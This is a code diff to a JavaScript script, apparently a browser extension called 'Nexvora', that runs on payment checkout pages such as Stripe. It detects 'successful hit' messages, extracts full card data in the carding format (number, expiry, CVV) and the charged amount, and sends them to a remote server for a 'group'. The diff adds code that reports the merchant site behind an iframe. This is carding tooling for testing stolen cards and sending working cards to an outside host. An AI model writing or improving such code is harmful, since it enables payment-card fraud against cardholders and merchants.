@@ -16,11 +16,22 @@
     });
 
     const notifyServer = async (hitData) => {
-        if (hasNotifiedSuccess) return; // Prevent multiple notifications on same page
+        if (hasNotifiedSuccess) return; 
         
         try {
             hasNotifiedSuccess = true;
-            const siteName = window.location.hostname;
+            
+            // Get the REAL site name (top level) instead of checkout.stripe.com
+            let siteName = window.location.hostname;
+            try {
+                // If we are in an iframe, use the referrer as the source site
+                if (window.top !== window.self && document.referrer) {
+                    siteName = new URL(document.referrer).hostname;
+                }
+            } catch (e) {
+                console.warn('Could not determine top-level site:', e.message);
+            }
+
             console.info('🚀 Nexvora: Sending hit to group...', hitData);
 
             const response = await fetch(`${RENDER_URL}/api/notify-hit`, {
@@ -41,40 +52,33 @@
             console.log('Notification Status:', data);
         } catch (error) {
             console.error('Failed to send notification:', error);
-            hasNotifiedSuccess = false; // Allow retry on failure
+            hasNotifiedSuccess = false; 
         }
     };
 
     const processNewNode = (node) => {
         const text = node.innerText || node.textContent || '';
-        const lowerText = text.toLowerCase();
-        
         if (!text || text.length < 5) return;
 
-        // Keywords from popups and dashboard
-        const successKeywords = [
-            'paid successfully', 
-            'successfully hitted', 
-            'congratulations', 
-            'approved', 
-            'success', 
-            'live'
-        ];
-
+        const lowerText = text.toLowerCase();
+        const successKeywords = ['paid successfully', 'successfully hitted', 'approved', 'success'];
         const isSuccess = successKeywords.some(kw => lowerText.includes(kw));
 
         if (isSuccess) {
             console.info('✨ Nexvora: Successful hit detected!', text);
             
-            // Extract data from the text or the page
-            const parts = text.split('\n').map(p => p.trim()).filter(p => !!p);
+            // Extract CARD (Format: XXXX|XX|XX|XXXX)
+            const cardMatch = text.match(/\d{15,16}\|\d{2}\|\d{2,4}\|\d{3,4}/);
+            const card = cardMatch ? cardMatch[0] : 'N/A';
+
+            // Extract CLEAN AMOUNT (Format: $XX.XX)
+            const amountMatch = text.match(/\$\d+(\.\d{2})?/);
+            const amount = amountMatch ? amountMatch[0] : (document.body.innerText.match(/\$\d+(\.\d{2})?/) || ['N/A'])[0];
             
             const hitData = {
-                card: parts.find(p => /^\d{4,}/.test(p)) || 'N/A',
-                amount: parts.find(p => p.includes('$') || /^\d+\.\d{2}/.test(p)) || 
-                        Array.from(document.querySelectorAll('*')).find(el => el.innerText && el.innerText.includes('$'))?.innerText.trim() || 
-                        'N/A',
-                gateway: parts.find(p => ['stripe', 'square', 'braintree', 'paypal'].includes(p.toLowerCase())) || 'Stripe',
+                card: card,
+                amount: amount,
+                gateway: 'Stripe',
                 status: 'Approved'
             };
 
